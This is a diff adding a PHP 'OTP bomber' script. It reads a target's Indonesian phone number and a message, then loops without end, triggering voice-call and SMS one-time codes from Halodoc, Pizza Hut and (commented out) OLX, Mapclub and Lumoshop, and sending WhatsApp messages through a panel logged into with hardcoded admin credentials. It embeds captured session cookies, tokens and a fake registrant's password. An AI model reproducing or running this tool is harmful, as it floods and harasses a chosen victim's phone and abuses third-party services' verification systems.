@@ -1,0 +1,139 @@
+function Curl($url, $header=0, $post=0, $proxy=0){
+	$ch = curl_init();
+	curl_setopt($ch, CURLOPT_URL, $url);
+	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+	curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
+	curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
+	curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
+	curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 30);
+	curl_setopt($ch, CURLOPT_COOKIE,TRUE);
+	curl_setopt($ch, CURLOPT_COOKIEFILE,"cookie.txt");
+	curl_setopt($ch, CURLOPT_COOKIEJAR,"cookie.txt");
+	if($post){
+		curl_setopt($ch, CURLOPT_POST, true);
+		curl_setopt($ch, CURLOPT_POSTFIELDS, $post);
+	}
+	if($proxy){
+		curl_setopt($ch, CURLOPT_HTTPPROXYTUNNEL, true);
+		curl_setopt($ch, CURLOPT_PROXY, $proxy[0]);
+		if($proxy[1]=="socks5"){
+			curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_SOCKS5);
+		}
+	}
+	if($header){
+		curl_setopt($ch, CURLOPT_HTTPHEADER, $header);
+	}
+	curl_setopt($ch, CURLOPT_HEADER, true);
+	$res = curl_exec($ch);
+	$c = curl_getinfo($ch);
+	if(!$c) return "Curl Error : ".curl_error($ch); else {
+		$head = substr($res, 0, curl_getinfo($ch, CURLINFO_HEADER_SIZE));
+		$body = substr($res, curl_getinfo($ch, CURLINFO_HEADER_SIZE));
+		curl_close($ch);
+		return array($head,$body);
+	}
+}
+function PesanWatsap($nomor,$pesan){
+	$h[] = "demomd.bermainapi.com";
+	$h[] = "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Safari/537.36";
+	
+	$data = ["username"=>"admin","password"=>"123456"];
+	curl('https://demomd.bermainapi.com/login.php',$h,http_build_query($data));
+	
+	$data = ["nomor"=>$nomor,"pesan"=>$pesan];
+	$r = curl('https://demomd.bermainapi.com/kirimmanual.php',$h,http_build_query($data))[1];
+	$title = explode("',",explode("title: '",$r)[1])[0];
+	if($title == "Success!"){
+		print h."Success ".p."-> ".c."Type: ".k."Whatsapp".n;
+	}else{
+		print m."Error! ".p."-> ".c."Type: ".k."Whatsapp".n;
+	}
+}
+function TelponBiasa($nomor){
+	$h = ["Host:www.halodoc.com", "content-length:51",'sec-ch-ua:" Not A;Brand";v="99", "Chromium";v="102", "Google Chrome";v="102"',"accept:application/json, text/plain, */*","x-xsrf-token:698579A24EA56C0FFFAF8EC4CB3878FC75AC8552A1FA78B5DD6EBEE764EEA532276579B9A869E52C5F051810B33452483920","sec-ch-ua-mobile:?1","user-agent:Mozilla/5.0 (Linux; Android 10; SM-M022F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Mobile Safari/537.36",'sec-ch-ua-platform:"Android"',"content-type:application/json","origin:https://www.halodoc.com","sec-fetch-site:same-origin","sec-fetch-mode:cors","sec-fetch-dest:empty","accept-encoding:gzip, deflate, br","accept-language:id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7","cookie:_ga=GA1.2.1543313695.1646049978","cookie:afUserId=5f8d958a-0b5d-4273-8f4f-5faa0fd14acd-o","cookie:XSRF-TOKEN=698579A24EA56C0FFFAF8EC4CB3878FC75AC8552A1FA78B5DD6EBEE764EEA532276579B9A869E52C5F051810B33452483920","cookie:_gcl_au=1.1.1312632912.1655318369","cookie:_gid=GA1.2.613342797.1655318370","cookie:ab.storage.deviceId.1cc23a4b-a089-4f67-acbf-d4683ecd0ae7=%7B%22g%22%3A%22bd08a369-2fcd-c770-b3fa-c4427a0cdbcc%22%2C%22c%22%3A1646049979917%2C%22l%22%3A1655318370099%7D","cookie:AF_SYNC=1655318375040","cookie:amp_394863=mP4ApHXmzlyfxF2n4uxpVC...1g5kajne8.1g5kaoi8h.6.0.6","cookie:ab.storage.sessionId.1cc23a4b-a089-4f67-acbf-d4683ecd0ae7=%7B%22g%22%3A%22d44ab253-585f-fda5-0a33-0b0c472dcc2a%22%2C%22e%22%3A1655320330338%2C%22c%22%3A1655318370090%2C%22l%22%3A1655318530338%7D"];
+	$data = json_encode(["phone_number"=>"+".$nomor,"channel" => "voice"]);
+	$r = json_decode(curl('https://www.halodoc.com/api/v1/users/authentication/otp/requests',$h,$data)[1],1);
+	if($r["otp_id"]){
+		print h."Success ".p."-> ".c."Type: ".k."Telefon:Halodoc".n;
+	}else{
+		print m."Error! ".p."-> ".c."Type: ".k."Telefon:Halodoc".n;
+	}
+}
+function OtpOlx($nomor){
+	$h = ['X-Panamera-fingerprint: ed8ed98fd83e61d9','User-Agent: android 16.02.002 olxid','x-origin-panamera: Production','laquesis: pan-56224@b#pan-56226@c#pan-59197@c#pan-60062@b#pan-60508@a#pan-61003@a#pan-66909@b','laquesisff: rate_us#listers_verification#notification_pref#edit_location#legion_migrate_v2#pan-27935#pan-46034#pan-42666#pan-48219#pan-48529#pan-54540','Content-Type: application/json; charset=UTF-8','Content-Length: 62','Host: api.olx.co.id','Connection: Keep-Alive','Accept-Encoding: gzip'];
+	$data = json_encode(["grantType"=>"phone","phone"=>"+".$nomor,"language"=>"en"]);
+	$r = json_decode(curl('https://api.olx.co.id/v2/auth/authenticate',$h,$data)[1],1);
+	if($r["nextAction"]){
+		print h."Success ".p."-> ".c."Type: ".k."Sms OTP OLX".n;
+	}else{
+		print m."Error! ".p."-> ".c."Type: ".k."Sms OTP OLX".n;
+	}
+}
+function OtpMapclub($nomor){
+	date_default_timezone_set("Asia/Jakarta");
+	$nomor = explode("62",$nomor)[1];
+	$h = ["Host: beryllium.mapclub.com","client-platform: WEB","client-timestamp: ".time(),"authorization: Bearer eyJhbGciOiJIUzUxMiJ9.eyJndWVzdENvZGUiOiI2ZjNlZDNiNi1jZWExLTQ5ZTctYTAxNi02NGI5YmE4NDljYmEiLCJleHBpcmVkIjoxNjYzNTgwMzY0NzI0LCJleHBpcmUiOjM2MDAsImV4cCI6MTY2MzU4MDM2NCwiaWF0IjoxNjYzNTc2NzY0LCJwbGF0Zm9ybSI6IldFQiJ9.B_jFA0EbB6OX9ftUyVEIOkQOeYL6AzOfs_j-vLsHtVFUsaCVSK_PJlPipGpNvYfzt2TfQKcQ5rLtPP0Ydu3Tew","content-type: application/json","user-agent: Mozilla/5.0 (Linux; Android 9; Redmi 6A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.99 Mobile Safari/537.36"];
+	$data = json_encode(["account"=>$nomor]);
+	$r = json_decode(curl('https://beryllium.mapclub.com/api/member/registration/sms/otp',$h,$data)[1],1);
+	if($r["success"]){
+		print h."Success ".p."-> ".c."Type: ".k."Sms OTP Mapclub".n;
+	}else{
+		print m."Error! ".p."-> ".c."Type: ".k."Sms OTP Mapclub".n;
+	}
+}
+function OtpLumoshop($nomor){
+	$h = ["Host: api.tokko.io","accept-language: id","user-agent: Mozilla/5.0 (Linux; Android 9; Redmi 6A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.99 Mobile Safari/537.36","x-tokko-api-client: merchant_web","content-type: application/json","accept: */*","x-tokko-api-client-version: 4.5.1"];
+	$data = json_encode(["operationName"=>"generateOTP","variables"=>["generateOtpInput"=>["phoneNumber"=>"+".$nomor,"hashCode"=>"","channel"=>"WHATSAPP","userType"=>"MERCHANT"]],"query"=>'mutation generateOTP($generateOtpInput: GenerateOtpInput!) {generateOtp(generateOtpInput: $generateOtpInput) {phoneNumber}}']);
+	$r = json_decode(curl('https://api.tokko.io/graphql',$h,$data)[1],1);
+	if($r["data"]){
+		print h."Success ".p."-> ".c."Type: ".k."OTP Lumoshop".n;
+	}else{
+		print m."Error! ".p."-> ".c."Type: ".k."OTP Lumoshop".n;
+	}
+	$data = json_encode(["operationName"=>"generateOTP","variables"=>["generateOtpInput"=>["phoneNumber"=>"+".$nomor,"hashCode"=>"","channel"=>"SMS","userType"=>"MERCHANT"]],"query"=>'mutation generateOTP($generateOtpInput: GenerateOtpInput!) {generateOtp(generateOtpInput: $generateOtpInput) {phoneNumber}}']);
+	$r = json_decode(curl('https://api.tokko.io/graphql',$h,$data)[1],1);
+	if($r["data"]){
+		print h."Success ".p."-> ".c."Type: ".k."OTP Lumoshop".n;
+	}else{
+		print m."Error! ".p."-> ".c."Type: ".k."OTP Lumoshop".n;
+	}
+}
+function OtpPizzahut($nomor){
+	$h = ["Host: api-prod.pizzahut.co.id","x-device-type: PC","x-platform: WEBMOBILE","x-channel: 2","accept: application/json","x-client-id: b39773b0-435b-4f41-80e9-163eef20e0ab","user-agent: Mozilla/5.0 (Linux; Android 9; Redmi 6A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.99 Mobile Safari/537.36","x-lang: en","x-device-id: web"];
+	$nomor = explode("62",$nomor)[1];
+	$data = json_encode(
+	["email"=>"Riley6729@yahoo.com",
+	"first_name"=>"Riley",
+	"gender"=>1,
+	"last_name"=>"Caldwell",
+	"password"=>"Lstj@876",
+	"phone"=>$nomor,
+	"birthday"=>"1996-05-12"]
+);
+	$r = json_decode(curl("https://api-prod.pizzahut.co.id/customer/v1/customer/register",$h,$data)[1],1);
+	if($r["code"] == 200){
+		print h."Success ".p."-> ".c."Type: ".k."OTP Pizzahut".n;
+	}else{
+		//print m."Error! ".p."-> ".c."Type: ".k."OTP Pizzahut".n;
+		print p."Pizzahut: ".$r["message"].n;
+	}
+}
+
+print m."No target di awali 62 gak pake +\n";
+$nomor = readline(p."No target: ".h);
+if(substr($nomor,0,2) !== "62"){
+	print m."kusus indonesia goblok\n";
+	print m."udah di bilang di awali 62 gak pake +\n";
+	exit;
+}
+$pesan = readline("Pesan: ");
+print line();
+
+while(true){
+//OtpLumoshop($nomor); //Mati
+//OtpMapclub($nomor); //forbiden
+//OtpOlx($nomor); //Sms
+TelponBiasa($nomor); //Telfon
+OtpPizzahut($nomor);
+PesanWatsap($nomor,$pesan); //Wa
+}
